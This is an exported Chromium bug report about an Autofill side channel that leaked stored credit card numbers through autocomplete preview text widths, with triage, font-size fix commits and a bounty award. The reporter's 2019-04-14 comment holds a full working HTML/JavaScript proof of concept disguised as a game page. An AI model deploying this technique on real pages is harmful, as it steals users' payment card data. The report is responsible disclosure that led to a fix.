# Security: Two autocomplete flaws STILL allow stealing credit card numbers

| Field | Value |
|-------|-------|
| **Issue ID** | [40094557](https://issues.chromium.org/issues/40094557) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | UI>Browser>Autofill |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@curative.com |
| **Assignee** | ba...@chromium.org |
| **Created** | 2019-04-10 |
| **Bounty** | $3,337.00 |

## Description

**VULNERABILITY DETAILS**  

<https://bugs.chromium.org/p/chromium/issues/detail?id=916838> detailed an exploit that allowed an attack page to steal users' credit card numbers with minimal user interaction, by getting the user to make their credit card number appear as autocomplete text in the box, then repeatedly changing the font of that autocomplete text and measuring the overall text width using the .scrollWidth property. It was declared fixed by making it impossible for a web page to change the font-family of autocomplete text. This fix did indeed stop my particular exploit from functioning. However, notably, the fact that .scrollWidth values respect the presence of autocomplete context (which I consider to itself be a bug, and the key part of the exploit) was \*not\* changed.

A modified version of that attack is still possible after the fix.

A little playing around in the Chrome 74 Beta on my Mac reveals a few interesting facts:

\* Font size of autocomplete text is still modifiable  

\* At sufficiently large font sizes, the widths of the digits 0-9 are all distinct  

\* Autocomplete text respects the maxlength HTML attribute of <textarea> which limits the number of characters rendered in the textarea

I figure that this permits the following alternative attack: create a form containing 16 textareas with their autocomplete property set to take a card number, each with 999px font-size, and each with different maxlength values ranging from 1-16. Induce the user to populate them with autocomplete text through the same mechanism as in <https://bugs.chromium.org/p/chromium/issues/detail?id=916838>. Have JavaScript check all of their .scrollWidth values. The difference in width between the n-1th and nth textarea then gives the width of the nth digit of the card number, which uniquely determines that digit.

I will provide a functioning exploit as soon as I have the chance.

**VERSION**  

Chrome Version: [74.0.3729.61] + [beta]  

Operating System: Should work for any OS

**REPRODUCTION CASE**  

Will provide soon; thought I'd file first and provide the demo later.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

N/A

**CREDIT INFORMATION**  

**Externally reported security bugs may appear in Chrome release notes. If**  

**this bug is included, how would you like to be credited?**  

Reporter credit: Mark Amery

## Timeline

### ct...@chromium.org (2019-04-10)

[Sheriff] Adding owner and some CCs based on the previous bug, and setting some labels.

[Monorail components: UI>Browser>Autofill]

### ro...@chromium.org (2019-04-10)

[Empty comment from Monorail migration]

### ma...@curative.com (2019-04-14)

Demo code below. This one's shorter than last time round and has no dependencies. All you need to do to reproduce is:

* Serve this over HTTPS
* Access the page in a Chrome browser that has a 16-digit card number stored

-----------

<!doctype>
<title>Totally trustworthy webpage</title>
<style>
textarea {
    white-space: nowrap;
    text-transform: lowercase;
    width: 1px;
    height: 1px;
    font-size: 9999px;
}
#cover {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: orange;
}
</style>
<form id="paymentForm">
    <input name="ccname"
           id="nameInput"
           required
           placeholder="Full Name"
           autocomplete="cc-name"
           autofocus
           rows="1">
    <label for="frmCCNum">Card Number</label>
    <textarea id="textSizeTester"></textarea>
</form>
<div id="cover">
    <h1>PRESS DOWN TO START PLAYING THE VERY FUN GAME</h1>
    <div>It is totally not a sinister front for something evil.</div>
</div>
<script>
const textAreas = [];

// Add 16 card number textareas, with maxlengths from 1-16, to the form, and
// store references to all of them.
for (let i = 1; i <= 16; i++) {
    const textArea = document.createElement('textarea');
    textArea.setAttribute('name', 'cardnumber');
    textArea.setAttribute('autocomplete', 'cc-number');
    textArea.setAttribute('maxlength', i);
    textArea.setAttribute('rows', 1);
    textAreas.push(textArea);
    paymentForm.appendChild(textArea);
}

// Utility function; nicked from https://stackoverflow.com/a/33292942/1709587
function timeout(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Wait for the user to trigger the autocomplete preview text, then yank the
// name input out of the form (hiding the autocomplete dialog) and call
// determineCardNumber to determine the card number from the textArea widths.
nameInput.addEventListener('keydown', async function (e) {
    if (e.keyCode == 38 || e.keyCode == 40) {
        while (textAreas[0].scrollWidth < 10) {
            await timeout(1);
        }
        nameInput.remove();
        alert(determineCardNumber(''));
    }
});

function determineCardNumber(numberSoFar='') {
    const nextDigit = numberSoFar.length,
          nextScrollWidth = textAreas[nextDigit].scrollWidth;

    for (let i = 0; i <= 9; i++) {
        const candidateNumber = numberSoFar + String(i);
        textSizeTester.value = candidateNumber;
        if (textSizeTester.scrollWidth == nextScrollWidth) {
            if (candidateNumber.length == 16) return candidateNumber;
            return determineCardNumber(candidateNumber);
        }
    }
    throw 'Failed!';
}
</script>


### ma...@curative.com (2019-04-14)

Live demo at https://siodfjawoifjawoi.com/zqwgspdiaiefigjfaeigrjejgrnersguir843tafm33gbn4.html. Go there and press the down arrow, and your card number (assuming it's 16 digits and stored in Chrome) will appear in an alert, even in Chrome 74.

### ro...@chromium.org (2019-04-15)

Thanks for the demo!

### ma...@curative.com (2019-04-16)

Caveat: last night I very briefly tested the above demo on a Windows machine and an Ubuntu one. It didn't work on either - reported 0000000000000000 on the Windows machine and errored out on the Ubuntu one. I don't have an explanation for why yet. Thus, so far, it only works on my MacBook Pro; if you have difficulty reproducing, I suggest trying on macOS.

I'll attempt to debug and make it more cross-platform for you.

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-30)

rogerm: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-05-15)

rogerm: Uh oh! This issue still open and hasn't been updated in the last 29 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@chromium.org (2019-05-30)

Friendly security sheriff ping - any progress on this? Are we able to reproduce the issue?

### sh...@chromium.org (2019-06-05)

[Empty comment from Monorail migration]

### es...@chromium.org (2019-06-21)

rogerm, can you please provide an update on this bug? Thanks.

### ft...@chromium.org (2019-06-21)

Changed owner to battre@, who landed a CL to handle this.

estark@: I will cc you on a thread that discussed this issue.

### ba...@chromium.org (2019-06-21)

Awwww, and I was so proud of myself for fixing the nasty layout problems. Thanks for forwarding.

### ba...@chromium.org (2019-06-21)

[Empty comment from Monorail migration]

### ba...@chromium.org (2019-06-21)

https://chromium-review.googlesource.com/c/chromium/src/+/1670897 is a much nicer fix than the current one because it uses the default font instead of system-ui font, meaning that for sites that neither change the font nor size of input fields, preview state looks exactly as it looked before the CLs for crbug.com/916838 landed.

I just need to update all the tests again and want to see whether I can go back to the nicer tests that I sacrificed in https://chromium-review.googlesource.com/c/chromium/src/+/1638541.

### ba...@chromium.org (2019-06-24)

The commit messages don't make it here... https://chromium-review.googlesource.com/c/chromium/src/+/1670897 landed and should fix this.

### ba...@chromium.org (2019-06-24)

Adding abdulsyed@ and requesting to merge to 76, as a heads up. This should still roll out to dev/canary first.

I would like to merge both
https://chromium-review.googlesource.com/c/chromium/src/+/1638541
and
https://chromium-review.googlesource.com/c/chromium/src/+/1670897

Note that the actual changes to Chrome (i.e. non-tests) are limited to the changes to third_party/blink/renderer/core/html/resources/html.css. Everything else is just test changes.

### sh...@chromium.org (2019-06-24)

This bug requires manual review: M76 has already been promoted to the beta branch, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: govind@(Android), kariahda@(iOS), cindyb@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ba...@chromium.org (2019-06-24)

+adetaylor@ for security merge request (got that from awhally's OOO responder)

### ad...@google.com (2019-06-24)

This seems sensible to merge to me, after we're confident through canary/dev, thanks for the heads up.

### sh...@chromium.org (2019-06-25)

[Empty comment from Monorail migration]

### ab...@google.com (2019-06-25)

branch:3809

### go...@chromium.org (2019-06-25)

Please merge your change to M76 branch 3809 ASAP so we can pick it up for tomorrow's Beta Release. We're cutting RC very soon. Thank you.

### ko...@chromium.org (2019-06-25)

I will merge the CLs from #18.

### ba...@chromium.org (2019-06-26)

Done.
https://chromium-review.googlesource.com/c/chromium/src/+/1676706
https://chromium-review.googlesource.com/c/chromium/src/+/1676707

### cr...@appspot.gserviceaccount.com (2019-06-26)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/036c081fe7cec07b3e04ffb16d869103e381b445

Commit: 036c081fe7cec07b3e04ffb16d869103e381b445
Author: battre@chromium.org
Commiter: battre@chromium.org
Date: 2019-06-26 07:50:58 +0000 UTC

Fix font size for prefilled values.

This is a better way to pin the fonts than http://crrev.com/669336.
Instead of pinning the fonts to the system font, they are actually
pinned to what LayoutThemeFontProvider::SystemFont maps to
-webkit-small-control. This creates even less jank on most sites
the rely on default fonts in input elements. Also the font sizes
are now pinned.

(cherry picked from commit 005563ec0a7e7b8b6d4b4bc20702f4eb900d128d)

Bug: 916838,951487
Change-Id: I2efb2eaf11276bc75052708f0c61a35ad9ae4c88
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1670897
Commit-Queue: Dominic Battré <battre@chromium.org>
Reviewed-by: Kent Tamura <tkent@chromium.org>
Reviewed-by: Koji Ishii <kojii@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#671647}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1676707
Reviewed-by: Dominic Battré <battre@chromium.org>
Cr-Commit-Position: refs/branch-heads/3809@{#590}
Cr-Branched-From: d82dec1a818f378c464ba307ddd9c92133eac355-refs/heads/master@{#665002}


### ba...@chromium.org (2019-06-28)

[Empty comment from Monorail migration]

### sr...@google.com (2019-07-01)

battre@ how confident are you this would not introduce new regressions in M75?  M75 re-spin might happen week of July 15, if that does not happen , would this bug trigger a re-spin? 
Can we wait for M76 to roll out for this bug?  

Can we get beta coverage for this bug next week and confirm it is fixed there so we can consider for M75 if needed

### ne...@chromium.org (2019-07-04)

Hi,

getting Beta coverage sounds like the right thing: battre, you're on top of this, right?

I prefer having this fix be included in an M75 Stable respin if battre is comfortable. The current M75 state introduces a pretty visible UX regression for a core feature (Autofill).

Patrick

### ba...@chromium.org (2019-07-04)

This has been on Beta since 76.0.3809.46: https://storage.googleapis.com/chromium-find-releases-static/036.html#036c081fe7cec07b3e04ffb16d869103e381b445

That has been rolled out since 06/27/19, so for about a week. I have seen one admin complaining about the font change and praising that we fixed the relayout issue (but I cannot find the bug right now). The font change is working as intended, though.

I see no way that this could influence stability (famous last words) because the only change to the Chrome release bundle is in third_party/blink/renderer/core/html/resources/html.css, moving / changing some CSS styles.

I would be happy to include it in a M75 re-spin (for visible improvements) but would probably not request a re-spin just for this as I don't know whether the abuse is in the wild.

### ba...@chromium.org (2019-07-08)

As https://crbug.com/chromium/916838 was published by the bot, I would now recommend to merge this to M75 and do a re-spin (ASAP?).

Assigning to awhally to assess.

### aw...@google.com (2019-07-08)

We should at least get this merged to 75, and start a discussion about the respin.

### ba...@chromium.org (2019-07-08)

Assigning to Abdul for merge approval.

### aw...@google.com (2019-07-08)

(No need to re-open for merges - in fact some queries and automation assume that bugs must be in the fixed state before they can be merged)

### ab...@google.com (2019-07-08)

Chatted with battre@, approving this for merge to M75. Branch:3770

### ba...@chromium.org (2019-07-08)

-Android as it does not have the preview state.

### aw...@google.com (2019-07-08)

+estark, fun autofill info disclosure bug 

### cr...@appspot.gserviceaccount.com (2019-07-08)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/f1299d956c0d682daa0021d59e699d94d46b82a3

Commit: f1299d956c0d682daa0021d59e699d94d46b82a3
Author: battre@chromium.org
Commiter: battre@chromium.org
Date: 2019-07-08 19:52:30 +0000 UTC

Pin preview font-family to system font in different way

crrev.com/640884 pinned the preview font-family to the system font by modifying
-internal-autofill-previewed. This cause a UI flaw in the sense that the
preview state triggered a relayout of the entire page and moved content around.

A previewed input element looks like this:

<input type="text">
  #shadow-root (user-agent)
  <div pseudo="-internal-input-suggested" id="placeholder"
      style="display: block! imporant;">suggested value</div>
  <div>actual value</div>
</input>

This CL moves the "font-family: system-ui !important;" from selector
input:-internal-autofill-previewed (which applies to the entire <input>
element and is set to the <input> element via
HTMLFormControlElement::SetAutofillState) to
input::-internal-input-suggested (which only applies to the inner <div>).

The internal <div> does not re-layout the rest of the DOM. so the reflow is
gone.

As a side effect, the font-family is only set for <input> elements but not
for <textarea> or <select> elements, which should not be counter the reason for
which crrev.com/640884 was implemented. Chrome does not fill <textarea> elements
and <select> elements draw themselves entirely differently.

(cherry picked from commit 8427f5edd001bccb4c82582d4f7a005ac8e8ee8c)

(cherry picked from commit 079a470ed30ef34890dbd62e088a5ee5920c0c1e)

Bug: 951487
Change-Id: I72fd7b1743e85513110c98f78a0074dc8fafd560
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1638541
Reviewed-by: Kent Tamura <tkent@chromium.org>
Reviewed-by: Vadym Doroshenko <dvadym@chromium.org>
Reviewed-by: Emil A Eklund <eae@chromium.org>
Reviewed-by: Koji Ishii <kojii@chromium.org>
Commit-Queue: Dominic Battré <battre@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/master@{#669336}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1676706
Reviewed-by: Dominic Battré <battre@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/3809@{#589}
Cr-Original-Branched-From: d82dec1a818f378c464ba307ddd9c92133eac355-refs/heads/master@{#665002}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1691198
Cr-Commit-Position: refs/branch-heads/3770@{#1142}
Cr-Branched-From: a9eee1c7c727ef42a15d86e9fa7b77ff0e63840a-refs/heads/master@{#652427}


### ba...@chromium.org (2019-07-08)

Merged in https://chromium-review.googlesource.com/c/chromium/src/+/1691198 and https://chromium-review.googlesource.com/c/chromium/src/+/1690587

### cr...@appspot.gserviceaccount.com (2019-07-08)

The following revision refers to this bug: 
https://chromium.googlesource.com/chromium/src.git/+/d0f4d3401dc16bcf699b6cdcfeae1f748de10a33

Commit: d0f4d3401dc16bcf699b6cdcfeae1f748de10a33
Author: battre@chromium.org
Commiter: battre@chromium.org
Date: 2019-07-08 19:53:58 +0000 UTC

Fix font size for prefilled values.

This is a better way to pin the fonts than http://crrev.com/669336.
Instead of pinning the fonts to the system font, they are actually
pinned to what LayoutThemeFontProvider::SystemFont maps to
-webkit-small-control. This creates even less jank on most sites
the rely on default fonts in input elements. Also the font sizes
are now pinned.

(cherry picked from commit 005563ec0a7e7b8b6d4b4bc20702f4eb900d128d)

(cherry picked from commit 036c081fe7cec07b3e04ffb16d869103e381b445)

Bug: 951487
Change-Id: I2efb2eaf11276bc75052708f0c61a35ad9ae4c88
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1670897
Commit-Queue: Dominic Battré <battre@chromium.org>
Reviewed-by: Kent Tamura <tkent@chromium.org>
Reviewed-by: Koji Ishii <kojii@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/master@{#671647}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1676707
Reviewed-by: Dominic Battré <battre@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/3809@{#590}
Cr-Original-Branched-From: d82dec1a818f378c464ba307ddd9c92133eac355-refs/heads/master@{#665002}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1690587
Cr-Commit-Position: refs/branch-heads/3770@{#1143}
Cr-Branched-From: a9eee1c7c727ef42a15d86e9fa7b77ff0e63840a-refs/heads/master@{#652427}


### ab...@google.com (2019-07-09)

[Empty comment from Monorail migration]

### ad...@google.com (2019-07-15)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-07-15)

[Empty comment from Monorail migration]

### na...@google.com (2019-07-30)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-07-30)

Congrats the Panel decided to reward $2,000 + a $1,337 bonus for this report!

### na...@google.com (2019-07-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/951487?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094557)*
